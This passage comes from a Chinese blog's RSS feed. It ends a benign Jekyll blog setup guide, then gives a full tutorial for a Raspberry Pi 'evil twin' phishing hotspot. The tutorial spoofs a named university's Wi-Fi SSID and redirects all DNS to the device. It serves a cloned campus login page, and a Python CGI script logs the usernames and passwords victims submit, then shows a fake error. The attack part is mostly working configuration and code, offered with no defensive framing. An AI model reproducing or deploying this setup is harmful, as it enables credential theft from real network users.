 +++
 &amp;lt;/section&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;添加页面，例如About Me页面&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;在根目录下新建me.md，内容如下：&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ---
 layout: me
 title: About Me
 permalink: /me/
 ---
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;在根目录的_layouts中新建me.html，内容如下：&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ---
 layout: default
 ---

 &amp;lt;article id=&quot;about-me&quot; class=&quot;post-container post-container--single&quot;&amp;gt;
   &amp;lt;h1 class=&quot;post-title&quot;&amp;gt;About Me&amp;lt;/h1&amp;gt;
   &amp;lt;/header&amp;gt;
   &amp;lt;section class=&quot;post&quot;&amp;gt;
     {% capture about %}{% include me.md %}{% endcapture %}
     {{ about | markdownify }}
   &amp;lt;/section&amp;gt;
 &amp;lt;/article&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;在根目录的_includes中新建me.md，内容为你想展示在页面的内容&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;修改根目录的_includes/header.html，添加按钮：&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;nav class=&quot;cover-navigation cover-navigation--primary&quot;&amp;gt;
   &amp;lt;ul class=&quot;navigation&quot;&amp;gt;
     &amp;lt;li class=&quot;navigation__item&quot;&amp;gt;&amp;lt;a href=&quot;{{ site.baseurl }}me&quot; title=&quot;link to {{ site.title }} about me&quot; class=&quot;blog-button&quot;&amp;gt;Me&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
   &amp;lt;/ul&amp;gt;
 &amp;lt;/nav&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;显示表格边界&lt;/p&gt;

    &lt;p&gt;在根目录的css/main.css中添加：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;style type=&quot;text/css&quot;&amp;gt;
 table{
     border-collapse: collapse;
     border-spacing: 0;
     border: 1px solid #F3F3F3;
 }

 th{
     border: 1px solid #F3F3F3;
     padding: 6px 13px
 }

 td{
     border: 1px solid #F3F3F3;
     padding: 6px 13px
 }
 &amp;lt;/style&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;section-2&quot;&gt;其它实用工具&lt;/h2&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;使用MathJax引擎在markdown中插入公式&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;在Sublime 2的Package Settings中选择OmniMarkupPreviewer，修改default setting中的&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &quot;mathjax_enabled&quot;: true
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;

        &lt;p&gt;以启用MathJax引擎&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;修改根目录下的_includes/head.html文件，在&amp;lt;head&amp;gt;标签中添加&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;script type=&quot;text/javascript&quot; src=&quot;https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default&quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;

        &lt;p&gt;以在页面渲染时加载MathJax.js&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;测试。在markdown文件中输入&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $$x=\frac{-b\pm\sqrt{b^2-4ac}}{2a}$$
 \\(x=\frac{-b\pm\sqrt{b^2-4ac}}{2a}\\)
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;

        &lt;p&gt;上面为行间公式，下面为行内公式。使用Sublime 2的OmniMarkupPreviewer或Jekyll Server进行预览&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在markdown中链接本地图片&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;在根目录中新建一个用于存放你的图片的文件夹，例如assets，放入图片，例如test.jpg&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;在markdown文件中链接&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ![TITLE](/assets/test.jpg &quot;TITLE&quot;)
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;

        &lt;p&gt;此适用于Jekyll Server进行预览，不适用于OmniMarkupPreviewer预览&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

</description>
        <pubDate>Fri, 08 Jan 2016 23:04:23 +0800</pubDate>
        <link>https://wuyinan0126.github.io//2016/GitHub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io//2016/GitHub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</guid>
        
        <category>GEEK</category>
        
        <category>原创</category>
        
        
        <category>GEEK</category>
        
        <category>原创</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 树莓派2创建钓鱼热点</title>
        <description>&lt;p&gt;&lt;em&gt;使用树莓派2和无线网卡创建钓鱼热点。包括树莓派、Raspbian系统、无线网卡和Micro SD卡的介绍，以及相关软件的安装和配置&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;关于树莓派&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;The Raspberry Pi is a tiny and affordable computer that you can use to learn programming through fun, practical projects.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://www.raspberrypi.org/&quot;&gt;树莓派&lt;/a&gt;是一个小型的而且很便宜的（$35）电脑，在这个电脑上你可以通过有趣的实用的项目学习编程&lt;/p&gt;

&lt;p&gt;树莓派2 Model B长这样：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2015-06-27-1.jpg&quot; alt=&quot;树莓派2 Model B&quot; title=&quot;树莓派2 Model B&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;关于系统&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Raspbian is a free operating system based on Debian optimized for the Raspberry Pi hardware.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;树莓派官方出的系统是&lt;a href=&quot;https://www.raspbian.org/&quot;&gt;Raspbian&lt;/a&gt;，基于Debian并根据树莓派的硬件进行了优化&lt;/p&gt;

&lt;p&gt;当然其他的操作系统，如Ubuntu、Fedora都有针对树莓派的版本。我选的系统是Kali Linux，选它的原因请参考标题&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Kali官方有针对树莓派2的版本，具体安装教程：[Kali Linux – Raspberry Pi&lt;/td&gt;
      &lt;td&gt;Kali Linux]&lt;a href=&quot;http://docs.kali.org/kali-on-arm/install-kali-linux-arm-raspberry-pi&quot;&gt;kali-linux&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;micro-sd&quot;&gt;关于无线网卡和Micro SD卡&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;我选的无线网卡是&lt;a href=&quot;http://item.jd.com/509932.html&quot;&gt;EDUP EP-N8508GS黄金版 迷你USB无线网卡 树莓派专用&lt;/a&gt;，芯片是rtl8188cus，免驱即插即用。&lt;/p&gt;

&lt;p&gt;选择无线网卡的时候请参考官网：&lt;a href=&quot;http://elinux.org/RPi_USB_Wi-Fi_Adapters&quot;&gt;RPi USB Wi-Fi Adapters&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;我选的Micro SD卡是&lt;a href=&quot;http://item.jd.com/679773.html&quot;&gt;闪迪（SanDisk）32GB UHS-I 至尊高速移动MicroSDHC-TF存储卡（读速48Mb/s）&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;选择Micro SD卡的时候请参考官网：&lt;a href=&quot;http://elinux.org/RPi_SD_cards&quot;&gt;RPi SD cards&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;section-2&quot;&gt;安装和配置相关软件&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;假设已经按照教程安装好了系统，也插上无线网卡了，接下来就是安装必要的软件。&lt;/p&gt;

&lt;p&gt;连接树莓派的方式有通过显示器（需要HDMI转接头）、SSH登录、VNC连接等，因为Kali开机自动启动SSH Server，所以只要知道树莓派的IP地址，用SSH连过去就行了，Kali的默认用户名是root，登录密码是toor。&lt;/p&gt;

&lt;p&gt;代码前有#的表示在bash下以root身份运行的代码，没有的表示修改的文件内容。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;修改更新源，在/etc/apt/sources.list中添加：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib
 deb-src http://mirrors.ustc.edu.cn/kali kali main non-free contrib
 deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free
 deb http://mirrors.aliyun.com/kali kali main non-free contrib
 deb-src http://mirrors.aliyun.com/kali kali main non-free contrib
 deb http://mirrors.aliyun.com/kali-security kali/updates main contrib non-free
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;然后进行更新：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # apt-get update &amp;amp;&amp;amp; apt-get upgrade
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;根分区扩充&lt;/p&gt;

    &lt;p&gt;下面链接中的文件可能有更新，请根据需要进入对应目录选择版本&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # wget http://archive.raspberrypi.org/debian/pool/main/r/raspi-config/raspi-config_20150131-1_all.deb
 # wget http://http.us.debian.org/debian/pool/main/t/triggerhappy/triggerhappy_0.3.4-2_armhf.deb
 # wget http://http.us.debian.org/debian/pool/main/l/lua5.1/lua5.1_5.1.5-7.1_armhf.deb
 # dpkg -i triggerhappy_0.3.4-2_armhf.deb
 # dpkg -i lua5.1_5.1.5-7.1_armhf.deb
 # dpkg -i raspi-config_20150131-1_all.deb
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;然后使用raspi-config命令进入系统设置，选择第一项Expand Filesystem扩充，当然系统设置中还有其他设置，根据需要进行设置即可。用df -lh检查文件系统大小，根分区是否为SD卡大小&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;安装和配置hostapd&lt;/p&gt;

    &lt;p&gt;hostapd的作用是提供无线共享，即配置并成功运行hostapd后，能够搜索到热点&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # apt-get install hostapd
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;由于无线网卡支持的问题，系统安装的hostapd不支持rtl8188cus芯片，需要将hostapd替换为兼容版本：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # wget http://www.daveconroy.com/wp3/wp-content/uploads/2013/07/hostapd.zip
 # unzip hostapd.zip 
 # sudo mv /usr/sbin/hostapd /usr/sbin/hostapd.bak
 # sudo mv hostapd /usr/sbin/hostapd.cat
 # sudo ln -sf /usr/sbin/hostapd.cat /usr/sbin/hostapd  
 # sudo chmod 755 /usr/sbin/hostapd
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;修改（没有的话新建）/etc/hostapd/hostapd.conf：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; interface=wlan0            
 ctrl_interface=wlan0
 ctrl_interface_group=0
 ssid=BUAA-WiFi                # 伪热点名，例如我的是校园网的WiFi热点名            
 channel=2                  
 macaddr_acl=0              
 ignore_broadcast_ssid=0    
 driver=rtl871xdrv         
 hw_mode=g                        
 wmm_enabled=1
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;因为是用来钓鱼的伪热点，所以不设置热点密码&lt;/p&gt;

    &lt;p&gt;修改/etc/default/hostapd，去掉DAEMON_CONF前的注释符号并修改为我们的配置文件路径：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;启动hostapd：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # service hostapd start
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;安装和配置dnsmasq&lt;/p&gt;

    &lt;p&gt;dnsmasq提供的是为接进热点的设备分配IP以及进行流量引导，Kali中已经安装好dnsmasq了&lt;/p&gt;

    &lt;p&gt;修改（没有的话新建）/etc/dnsmasq.conf：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; interface=wlan0
 bind-interfaces
 domain=rpi
 address=/#/192.168.126.126        # 将对所有网站的访问重定向到本机
 dhcp-range=192.168.126.97,192.168.126.125,255.255.255.224,12h	# IP分配池和过期时间
 dhcp-option=3,192.168.126.126 	  # Router IP
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;启动dnsmasq：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # dnsmasq
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;添加iptables规则&lt;/p&gt;

    &lt;p&gt;修改/etc/sysctl.conf：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; net.ipv4.ip_forward=1
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;修改/proc/sys/net/ipv4/ip_forward为1&lt;/p&gt;

    &lt;p&gt;添加转发规则：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
 # sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
 # sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;然后用iptables -t nat -S和iptables -S检查是否添加成功&lt;/p&gt;

    &lt;p&gt;为了让上面的规则在开始时自动添加，执行：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # sh -c &quot;iptables-save &amp;gt; /etc/iptables.ipv4.nat&quot;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;设置wlan0的静态IP&lt;/p&gt;

    &lt;p&gt;修改/etc/network/interfaces，添加：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; auto wlan0
 allow-hotplug wlan0
 iface wlan0 inet static
         address 192.168.126.126    # 与之前dhcpd.conf填写的网关地址相同
         netmask 255.255.255.240    # 与之前dhcpd.conf填写的子网掩码相同
 up iptables-restore &amp;lt; /etc/iptables.ipv4.nat
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;安装和配置apache2&lt;/p&gt;

    &lt;p&gt;apache2提供的是为将重定向的流量引导到本机服务器运行的网页中，Kali中已经安装好apache2了&lt;/p&gt;

    &lt;p&gt;修改/etc/apache2/sites-available/default，在合适的标签下添加：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;VirtualHost *:80&amp;gt;
 ...
 ServerName gw.buaa.edu.cn             # 伪造服务器名
 DirectoryIndex gw.buaa.edu.cn.html    # 将默认界面改为钓鱼网站页面
 ...
 &amp;lt;Directory &quot;/usr/lib/cgi-bin&quot;&amp;gt;
     AddHandler cgi-script .py         # 添加对.py的支持
 ...
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;启动apache2：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # service apache2 start
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;编写钓鱼网站&lt;/p&gt;

    &lt;p&gt;我要钓鱼的是学校的校园网登录网站，所以copy校园网登录的界面，修改里面的表单提交action，提交到本机服务的后台，例如我的钓鱼网站/var/www/gw.buaa.edu.cn.html：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ...
 &amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
     function login() {
         var errorMsg = [];
         var username = $(&quot;input[name=&#39;username&#39;]&quot;).val();
         var password = $(&quot;input[name=&#39;password&#39;]&quot;).val();
         if(username == &#39;&#39; || username == &#39;用户名*&#39;) {
              errorMsg.push(&#39;请输入用户名.&#39;);
              $(&#39;#txtuser&#39;).focus();
         }
         if (password == &#39;&#39; || password == &#39;密码*&#39;) {
             errorMsg.push(&#39;请输入密码.&#39;);
             $(&#39;#txtPwd&#39;).focus();
         }
         if (errorMsg != &quot;&quot;) {
             if (errorMsg.length &amp;gt; 0) {
                 $(&#39;#divloginError&#39;).html(&#39;&#39;).html($(&#39;&amp;lt;ul/&amp;gt;&#39;, {
                     html: &#39;&amp;lt;li&amp;gt;&#39; + errorMsg.join(&#39;&amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;&#39;) + &#39;&amp;lt;/li&amp;gt;&#39;
                 })).show();
                 $(&#39;#dvloginErrorM&#39;).show();
                 $.mobile.silentScroll(125);
             } else {
                 $(&#39;#dvloginErrorM&#39;).hide();
             }
         } else {
             document.aspnetForm.submit();
         }
     }
 &amp;lt;/script&amp;gt;
 ...
 &amp;lt;!--表单提交--&amp;gt;
 &amp;lt;form name=&quot;aspnetForm&quot; method=&quot;post&quot; action=&quot;/cgi-bin/login.py&quot;...&amp;gt;
 &amp;lt;!--用户提交按钮--&amp;gt;
     &amp;lt;a href=&quot;javascript:login()&quot;.../&amp;gt;
 &amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;编写后台处理程序，我用的是python的cgi，在/usr/lib/gci-bin下新建login.py：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ```
 #!/usr/bin/python
 #-*- encoding: utf-8 -*-
 import cgi, cgitb
 form = cgi.FieldStorage()
 username = form.getvalue(&#39;username&#39;)                # 获得用户名
 password = form.getvalue(&#39;password&#39;)                # 获得密码
 f = open(&#39;/cat/gw.buaa.edu.cn.log&#39;, &#39;a&#39;)            # 注意apache是否有所写文件夹的权限！！
 f.write(&quot;%s: %s\r\n&quot; % (username, password))        # 将用户名和密码写入文件
 f.close()
 print &quot;Content-type:text/html\r\n\r\n&quot;              # 然后显示一个错误页面
 print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&lt;/span&gt;&#39;
 print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Error 126&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;&#39;
 print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&lt;/span&gt;&#39;
 print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Error establishing a database connection&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;&#39;
 print &#39;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&#39;
 ```
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;将login.py的权限设置为755，即有运行权限&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将上述配置开机自启动&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # update-rc.d hostapd enable
 # update-rc.d isc-dhcp-server enable
 # update-rc.d apache2 enable	
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;对于dnsmasq，需要手动编写开机启动脚本，在/etc/init.d/下新建文件dnsmasq：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ```
 #!/bin/bash
 set -e
 case &quot;$1&quot; in
         start)
                 dnsmasq&amp;amp;
                 ;;
         stop)
                 killall -9 dnsmasq
                 ;;
         restart)
                 killall -9 dnsmasq
                 dnsmasq&amp;amp;
                 ;;
 esac
 exit 0
 ```
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;然后进入/etc/rc3.d/下，执行：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # ln -sf /etc/init.d/dnsmasq S06dnsmasq
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;S06表示启动优先级，数字越大，优先级越低，比如服务A的运行要依赖服务B，那A的数字就应该大于B的&lt;/p&gt;

    &lt;p&gt;最后，编辑/etc/rc.local，添加：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; service dnsmasq start
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;section-3&quot;&gt;测试运行&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;首先连接上伪热点BUAA-WIFI，然后在浏览器输入一个网址，浏览器将自动跳转到校园网登录界面：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2015-06-27-2.jpg&quot; alt=&quot;测试界面&quot; title=&quot;测试界面&quot; /&gt;&lt;/p&gt;

&lt;p&gt;当用户输入登录的用户名和密码，点击登录后，将跳转到错误页面，但是用户名和密码都已经被后台服务器记录到文件中。&lt;/p&gt;

</description>
        <pubDate>Sat, 27 Jun 2015 23:13:23 +0800</pubDate>
        <link>https://wuyinan0126.github.io//2015/%E6%A0%91%E8%8E%93%E6%B4%BE2%E5%88%9B%E5%BB%BA%E9%92%93%E9%B1%BC%E7%83%AD%E7%82%B9/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io//2015/%E6%A0%91%E8%8E%93%E6%B4%BE2%E5%88%9B%E5%BB%BA%E9%92%93%E9%B1%BC%E7%83%AD%E7%82%B9/</guid>
        
        <category>GEEK</category>
        
        <category>原创</category>
        
        <category>树莓派</category>
        
        
        <category>GEEK</category>
        
        <category>原创</category>
        
        <category>树莓派</category>
        
      </item>
    
  </channel>
</rss>
